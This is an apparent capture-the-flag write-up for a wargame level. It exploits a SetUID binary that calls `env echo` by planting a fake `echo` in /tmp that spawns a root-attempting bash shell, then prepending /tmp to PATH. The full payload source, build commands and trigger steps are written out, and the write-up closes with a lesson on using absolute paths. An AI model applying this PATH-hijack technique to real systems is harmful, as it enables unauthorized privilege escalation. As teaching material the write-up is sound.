
---

### ðŸ“œ Challenge Description

> There is a vulnerability in the following SetUID program that allows **arbitrary code execution** due to how the command is constructed.
> 
> Log in as `level01` (password: `level01`) and examine the binary located at `/home/flag01`.

---

### ðŸ§¬ Source Code Review

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

**Key Observation:**

- The binary executes `/usr/bin/env echo ...`, which looks up `echo` in the current `$PATH`.
    
- This opens the door for **$PATH injection**, allowing an attacker to hijack which `echo` binary gets executed.
    

---

### ðŸŽ¯ Goal

Leverage the insecure command execution to escalate privileges to `flag01` and retrieve the flag.

---

### ðŸ› ï¸ Exploitation Steps

#### 1. Create a malicious `echo`

```bash
cd /tmp

nano echo.c
```

Paste the payload:

```c
int main() {
    setuid(0); setgid(0);
    system("/bin/bash");
    return 0;
}
```

#### 2. Compile and prepare

```bash
gcc echo.c -o echo
chmod +x echo
```

#### 3. Prepend `/tmp` to the `$PATH`

```bash
export PATH=/tmp:$PATH
```

This ensures your fake `echo` is executed instead of the real one.

---

#### 4. Trigger the vulnerability

```bash
cd /home/flag01
./flag01
```

You now have a shell running with the privileges of `flag01`.

---

#### 5. Capture the flag

```bash
getflag
```

âœ… **Output:**

```
You have successfully executed getflag on a target account
```

---

### ðŸ“˜ Takeaway

This level demonstrates how untrusted search path usage in privileged binaries can lead to serious security issues. By relying on `$PATH` to resolve executables (even basic ones like `echo`), a SetUID binary becomes vulnerable to **command hijacking**.

> Always use **absolute paths** and avoid using `/usr/bin/env` in privileged contexts.

---
